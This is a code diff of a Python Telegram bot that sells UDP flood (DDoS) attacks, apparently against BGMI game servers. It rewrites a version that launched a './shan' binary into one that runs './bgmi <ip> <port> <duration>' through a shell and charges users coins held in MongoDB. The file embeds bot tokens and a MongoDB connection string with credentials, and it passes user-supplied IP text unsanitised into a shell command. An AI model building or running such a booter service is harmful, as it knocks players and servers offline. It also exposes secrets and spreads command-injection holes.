@@ -1,369 +1,299 @@
-import subprocess
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+import asyncio
 from datetime import datetime, timedelta
-from apscheduler.schedulers.background import BackgroundScheduler
-from functools import partial
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
+from motor.motor_asyncio import AsyncIOMotorClient
 
-# Bot token and channel IDs
-BOT_TOKEN = "7773477885:AAEHhes4_dMka2T50CCajdXONlt3XNmHyos"
-CHANNEL_ID = ["-1002247039181", "-1002204468342"]
-OWNER_ID = {6939572417}  # Replace with your owner IDs
+bot_start_time = datetime.now()
+attack_in_progress = False
+current_attack = None  # Store details of the current attack
+attack_history = []  # Store attack logs
 
-# Constants
-INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
-MAX_TIME = 60
-COOLDOWN_TIME = 600
+TELEGRAM_BOT_TOKEN = '7125146756:AAGEc1B72NAKRIGSSBGC6uSkuGpu-O4xx5Y'  # Replace with your bot token
+ADMIN_USER_IDS = [757915155, 5056902784]  # Admin user IDs list
+MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
+DB_NAME = "ninjadaksh"
+COLLECTION_NAME = "users"
+ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
-# Global variables
-last_attack_time = {}
-bgmi_blocked = False
-admins_file = "admins.txt"
-logs_file = "logs.txt"
-blocked_users_file = "blocked_users.txt"
-admins = set()
-blocked_users = set()
-going_attacks = {}
-scheduler = BackgroundScheduler()  # Initialize the scheduler
-scheduler.start()  # Start the scheduler
-daily_bgmi_usage = {}
+# MongoDB setup
+mongo_client = AsyncIOMotorClient(MONGO_URI)
+db = mongo_client[DB_NAME]
+users_collection = db[COLLECTION_NAME]
 
-def reset_daily_usage():
-    global daily_bgmi_usage
-    daily_bgmi_usage = {}
+async def get_user(user_id):
+    """Fetch user data from MongoDB."""
+    user = await users_collection.find_one({"user_id": user_id})
+    if not user:
+        return {"user_id": user_id, "coins": 0}
+    return user
 
-scheduler.add_job(reset_daily_usage, "cron", hour=0)  # Reset at midnight
+async def update_user(user_id, coins):
+    """Update user coins in MongoDB."""
+    await users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {"coins": coins}},
+        upsert=True
+    )
 
-# Admin management
-def load_admins():
-    global admins
-    try:
-        with open(admins_file, "r") as f:
-            admins = {int(line.strip()) for line in f if line.strip().isdigit()}
-    except FileNotFoundError:
-        admins = OWNER_ID
-        save_admins()
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*❄️ WELCOME TO Bot Owner ULTIMATE UDP FLOODER ❄️*\n\n"
+        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
+        "*✨ Key Features: ✨*\n"
+        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
+        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
+        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
+        "*⚠️ Kaise Use Kare? ⚠️*\n"
+        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
+        "*💬 Queries or Issues? 💬*\n"
+        "*Contact Admin: Bot Owner*"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-def save_admins():
-    with open(admins_file, "w") as f:
-        f.writelines(f"{admin_id}\n" for admin_id in admins)
+async def mahakal(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    args = context.args
 
-# Blocked users management
-def load_blocked_users():
-    global blocked_users
-    try:
-        with open(blocked_users_file, "r") as f:
-            blocked_users = {int(line.strip()) for line in f if line.strip().isdigit()}
-    except FileNotFoundError:
-        blocked_users = set()
-        save_blocked_users()
+    if chat_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
+        return
 
-def save_blocked_users():
-    with open(blocked_users_file, "w") as f:
-        f.writelines(f"{user_id}\n" for user_id in blocked_users)
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /mahakal <add|rem> <user_id> <coins>*", parse_mode='Markdown')
+        return
 
-# Logging
-def log_attack(user_id, username, ip, port, time_sec):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(logs_file, "a") as f:
-        f.write(f"{timestamp} - UserID: {user_id}, Username: {username}, IP: {ip}, Port: {port}, Time: {time_sec}\n")
+    command, target_user_id, coins = args
+    coins = int(coins)
+    target_user_id = int(target_user_id)
 
-# Helper to check channel membership
-async def is_user_in_all_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    for channel_id in CHANNEL_ID:
-        try:
-            member_status = await context.bot.get_chat_member(channel_id, user_id)
-            if member_status.status not in ["member", "administrator", "creator"]:
-                return False
-        except Exception:
-            return False
-    return True
+    user = await get_user(target_user_id)
 
-# Attack completion notification
-async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE, user_id: int, ip: str, port: int):
+    if command == 'add':
+        new_balance = user["coins"] + coins
+        await update_user(target_user_id, new_balance)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
+    elif command == 'rem':
+        new_balance = max(0, user["coins"] - coins)
+        await update_user(target_user_id, new_balance)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
+
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress, attack_end_time, bot_start_time
+
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    args = context.args
+
+    user = await get_user(user_id)
+
+    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- Bot Owner*",
+            parse_mode='Markdown'
+        )
+        return
+
+    if attack_in_progress:
+        remaining_time = (attack_end_time - datetime.now()).total_seconds()
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
+            parse_mode='Markdown'
+        )
+        return
+
+    if len(args) != 3:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
+                "*👉 /attack <ip> <port> <duration>*\n"
+                "*📌 Example: /attack 192.168.1.1 26547 240*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
+
+    ip, port, duration = args
+    port = int(port)
+    duration = int(duration)
+
+    # Check for restricted ports
+    restricted_ports = [17500, 20000, 20001, 20002]
+    if port in restricted_ports or (100 <= port <= 999):
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
+
+    if duration > ATTACK_TIME_LIMIT:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
+                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
+            ),
+            parse_mode='Markdown'
+        )
+        return
+
+    # Deduct coins
+    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
+    await update_user(user_id, new_balance)
+
+    attack_in_progress = True
+    attack_end_time = datetime.now() + timedelta(seconds=duration)
     await context.bot.send_message(
-        chat_id=user_id,
-        text=f"\u2705 The attack on \n\U0001F5A5 IP: {ip},\n\U0001F310 Port: {port} has finished."
+        chat_id=chat_id,
+        text=(
+            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
+            f"*💣 Target IP: {ip}*\n"
+            f"*🔢 Port: {port}*\n"
+            f"*🕒 Duration: {duration} seconds*\n"
+            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
+            f"*📉 Remaining Balance: {new_balance}*\n\n"
+            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
+        ),
+        parse_mode='Markdown'
     )
-    going_attacks.pop((user_id, ip, port), None)  # Remove from ongoing attacks
 
-# Handlers
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-    if user_id in blocked_users:
-        await update.message.reply_text("\u274C You are blocked from using this bot.")
-        return
-
-    if not await is_user_in_all_channels(user_id, context):
-        await update.message.reply_text(
-            "\u274C Access Denied! Please join the required channels to use this bot.\n"
-            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
-            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)\n"
-            "\u2022 Max time limit: 60 seconds\n"
-            "\u2022 Cooldown time: 600 seconds\n"
-            "\u2022 Purchase admin privileges for no restrictions!\n\n"
-            "\u2022OWNER - @shantanu24_6 ",
-            parse_mode="Markdown",
-        )
-    else:
-        await update.message.reply_text(
-            "\u2705 Welcome! Use /bgmi to start.\n"
-            "\u2022 Max time limit: 60 seconds\n"
-            "\u2022 Cooldown time: 600 seconds\n"
-            "\u2022 Purchase admin privileges for no restrictions!\n"
-            "\u2022OWNER - @shantanu24_6 "
-        )
-
-async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global bgmi_blocked, last_attack_time, daily_bgmi_usage
-    user_id = update.effective_user.id
-    username = update.effective_user.username or "Unknown"
-
-    if user_id in blocked_users:
-        await update.message.reply_text("\u274C You are blocked from using this command.")
-        return
-
-    if bgmi_blocked:
-        await update.message.reply_text("\u274C The /bgmi command is currently blocked.")
-        return
-
-    if not await is_user_in_all_channels(user_id, context):
-        await update.message.reply_text(
-            "\u274C Please join all required channels to use this command:\n"
-            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
-            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)",
-            parse_mode="Markdown",
-        )
-        return
-
-    # Daily usage limit for free users
-    if user_id not in admins and user_id not in OWNER_ID:
-        daily_usage = daily_bgmi_usage.get(user_id, 0)
-        if daily_usage >= 5:
-            await update.message.reply_text(
-                "\u274C You have reached your daily limit of 5 uses.\n"
-                "Purchase admin privileges for unlimited usage."
-            )
-            return
-        daily_bgmi_usage[user_id] = daily_usage + 1
-
-    now = datetime.now()
-    last_time = last_attack_time.get(user_id, None)
-    if user_id not in admins and user_id not in OWNER_ID:
-        if last_time and (now - last_time).total_seconds() < COOLDOWN_TIME:
-            remaining = COOLDOWN_TIME - (now - last_time).total_seconds()
-            await update.message.reply_text(f"\u23F3 Please wait {int(remaining)} seconds before using this command again.\n\u2022TO REMOVE COOLDOWN TIME PURCHASE ADMIN PLAN BY \u2022OWNER - @shantanu24_6 ")
-            return
-
-    if len(context.args) != 3:
-        await update.message.reply_text(
-            "\u26A0 Usage: /bgmi <ip> <port> <time>\n\n"
-            "\u2022 Max time limit: 60 seconds\n"
-            "\u2022 Cooldown time: 600 seconds\n"
-            "\u2022 Purchase admin privileges for no restrictions!"
-            "\u2022OWNER - @shantanu24_6 "
-        )
-        return
-
-    ip, port, time_str = context.args
-    try:
-        port = int(port)
-        time_sec = int(time_str)
-    except ValueError:
-        await update.message.reply_text("\u26A0 Invalid input. Port and time must be numeric.")
-        return
-
-    if port in INVALID_PORTS:
-        await update.message.reply_text("\u26A0 This port is not allowed.")
-        return
-
-    if user_id not in admins and time_sec > MAX_TIME:
-        await update.message.reply_text("\u26A0 Non-admins are limited to 60 seconds.")
-        return
+async def run_attack(chat_id, ip, port, duration, context):
+    global attack_in_progress, attack_end_time
+    attack_in_progress = True
 
     try:
-        subprocess.Popen(["./shan", ip, str(port), str(time_sec)])
-        going_attacks[(user_id, ip, port)] = {
-            "username": username,
-            "time": time_sec,
-            "start_time": datetime.now(),
-        }
-
-        log_attack(user_id, username, ip, port, time_sec)
-        last_attack_time[user_id] = now
-
-        scheduler.add_job(
-            partial(notify_attack_finished, context),
-            "date",
-            run_date=now + timedelta(seconds=time_sec),
-            args=[user_id, ip, port],
+        command = f"./bgmi {ip} {port} {duration} {13} {600}"
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
         )
-        await update.message.reply_text(f"\u2705 Attack started:\n\U0001F5A5 IP: {ip}\n\U0001F310 Port: {port}\n\u23F3 Time: {time_sec} seconds\n\n\u2022OWNER - @shantanu24_6 ")    
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
     except Exception as e:
-        await update.message.reply_text(f"\u274C Failed to start attack: {e}")
-
-async def ongoingattacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in admins:
-        await update.message.reply_text("\u274C Only admins can view ongoing attacks.")
-        return
-
-    if not going_attacks:
-        await update.message.reply_text("\u2139 No ongoing attacks.")
-        return
-
-    message = "\u2022 Ongoing Attacks:\n"
-    for (uid, ip, port), details in going_attacks.items():
-        elapsed = (datetime.now() - details["start_time"]).total_seconds()
-        remaining = details["time"] - elapsed
-        message += (
-            f"\u2022 User: {details['username']} (ID: {uid})\n"
-            f"\u2022 IP: {ip}, Port: {port}\n"
-            f"\u23F3 Time: {details['time']} sec, Remaining: {int(remaining)} sec\n\n"
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
+            parse_mode='Markdown'
         )
 
-    await update.message.reply_text(message)
+    finally:
+        attack_in_progress = False
+        attack_end_time = None
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                "*✅ [ATTACK FINISHED] ✅*\n\n"
+                f"*💣 Target IP: {ip}*\n"
+                f"*🔢 Port: {port}*\n"
+                f"*🕒 Duration: {duration} seconds*\n\n"
+                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
+            ),
+            parse_mode='Markdown'
+        )
 
-async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in admins:
-        await update.message.reply_text("\u274C Only admins can view logs.")
-        return
+async def uptime(update: Update, context: CallbackContext):
+    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
+    minutes, seconds = divmod(int(elapsed_time), 60)
+    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')
 
-    try:
-        with open(logs_file, "r") as f:
-            await update.message.reply_document(f)
-    except FileNotFoundError:
-        await update.message.reply_text("\u2139 No logs available.")
-
-async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in OWNER_ID:
-        await update.message.reply_text("\u274C Only the owner can add admins.")
-        return
-
-    if len(context.args) != 2:
-        await update.message.reply_text("\u26A0 Usage: /addadmin <user_id> <no_of_days>")
-        return
-
-    try:
-        new_admin_id = int(context.args[0])
-        days = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("\u26A0 Invalid input. Use integers for user ID and number of days.")
-        return
-
-    admins.add(new_admin_id)
-    save_admins()
-
-    # Schedule admin removal after the specified number of days
-    scheduler.add_job(
-        partial(remove_admin_job, new_admin_id),
-        "date",
-        run_date=datetime.now() + timedelta(days=days)
+async def myinfo(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user = await get_user(chat_id)
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=f"**Your Info:**\n\nCoins: {user['coins']}\n\nYou can attack by spending {COINS_REQUIRED_PER_ATTACK} coins.",
+        parse_mode='Markdown'
     )
 
-    await update.message.reply_text(f"\u2705 User {new_admin_id} added as admin for {days} days.")
+async def help(update: Update, context: CallbackContext):
+    help_message = (
+        "*📝 Here's a list of available commands:*\n\n"
+        "*🆘 /start* - To start using the bot.\n"
+        "*🛡️ /mahakal <add|rem> <user_id> <coins>* - Add or remove coins from a user (Admin only).\n"
+        "*⚔️ /attack <ip> <port> <duration>* - Start a DDoS attack (coins required).\n"
+        "*💼 /myinfo* - To check your coin balance.\n"
+        "*⏱️ /uptime* - To check bot's uptime.\n"
+        "*📜 /help* - To see this help message."
+    )
+    await context.bot.send_message(update.effective_chat.id, text=help_message, parse_mode='Markdown')
 
-# Helper function to remove admin privileges
-def remove_admin_job(admin_id):
-    admins.discard(admin_id)
-    save_admins()
-    
-async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in OWNER_ID:
-        await update.message.reply_text("\u274C Only the owner can remove admins.")
+async def broadcast(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+
+    # Only allow the admins to use the broadcast command
+    if chat_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*🖕 Chal nikal! Teri aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*",
+            parse_mode='Markdown'
+        )
         return
 
-    if len(context.args) != 1:
-        await update.message.reply_text("\u26A0 Usage: /removeadmin <user_id>")
-        return
-
-    admin_id = int(context.args[0])
-    admins.discard(admin_id)
-    save_admins()
-    await update.message.reply_text(f"\u2705 User {admin_id} removed from admin list.")
-
-async def blockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global bgmi_blocked
-    bgmi_blocked = True
-    await update.message.reply_text("\u274C The /bgmi command has been blocked.")
-
-async def unblockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global bgmi_blocked
-    bgmi_blocked = False
-    await update.message.reply_text("\u2705 The /bgmi command has been unblocked.")
-
-async def showadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in OWNER_ID:
-        await update.message.reply_text("\u274C Only the owner can view the admin list.")
-        return
-
-    if not admins:
-        await update.message.reply_text("\u2139 No admins available.")
-        return
-
-    message = "\u2022 Admins:\n" + "\n".join(str(admin_id) for admin_id in admins)
-    await update.message.reply_text(message)
-
-async def blockuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in OWNER_ID:
-        await update.message.reply_text("\u274C Only the owner can block users.")
-        return
-
-    if len(context.args) != 1:
-        await update.message.reply_text("\u26A0 Usage: /blockuser <user_id>")
-        return
-
-    user_to_block = int(context.args[0])
-    blocked_users.add(user_to_block)
-    save_blocked_users()
-    await update.message.reply_text(f"\u274C User {user_to_block} has been blocked.")
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in OWNER_ID:
-        await update.message.reply_text("\u274C Only the owner can broadcast messages.")
-        return
-
+    # Ensure the message is provided
     if not context.args:
-        await update.message.reply_text("\u26A0 Usage: /broadcast <message>")
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*⚠️ Message nahi diya! Use: /broadcast <message>*",
+            parse_mode='Markdown'
+        )
         return
 
-    message = " ".join(context.args)
+    # Get the broadcast message
+    broadcast_message = " ".join(context.args)
 
-    for admin_id in admins.union(OWNER_ID):
+    # Fetch all users from MongoDB
+    users_cursor = users_collection.find()
+    user_data = await users_cursor.to_list(length=None)
+
+    # Send the broadcast message to each user
+    for user in user_data:
+        user_id = user.get("user_id")
         try:
-            await context.bot.send_message(chat_id=admin_id, text=message)
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=broadcast_message,
+                parse_mode='Markdown'
+            )
         except Exception as e:
-            print(f"Failed to send message to {admin_id}: {e}")
+            # Log failed message sends
+            print(f"Failed to send broadcast to {user_id}: {str(e)}")
 
-    await update.message.reply_text("\u2705 Broadcast message sent.")
+    # Notify the admin that the broadcast is complete
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=f"*✅ Broadcast complete! Message sent to {len(user_data)} users.*",
+        parse_mode='Markdown'
+    )
 
-# Main function
 def main():
-    load_admins()
-    load_blocked_users()
-    app = Application.builder().token(BOT_TOKEN).build()
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    
+    # Adding the /mahakal command handler
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("mahakal", mahakal))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("myinfo", myinfo))
+    application.add_handler(CommandHandler("help", help))
+    application.add_handler(CommandHandler("uptime", uptime))
+    application.add_handler(CommandHandler("broadcast", broadcast))  # Add the /broadcast handler
+    
+    application.run_polling()
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("bgmi", bgmi))
-    app.add_handler(CommandHandler("ongoingattacks", ongoingattacks))
-    app.add_handler(CommandHandler("logs", logs))
-    app.add_handler(CommandHandler("addadmin", addadmin))
-    app.add_handler(CommandHandler("removeadmin", removeadmin))
-    app.add_handler(CommandHandler("blockbgmi", blockbgmi))
-    app.add_handler(CommandHandler("unblockbgmi", unblockbgmi))
-    app.add_handler(CommandHandler("showadmin", showadmin))
-    app.add_handler(CommandHandler("blockuser", blockuser))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-
-    app.run_polling()
-
-if __name__ == "__main__":
-    main() 
-
+if __name__ == '__main__':
+    main()
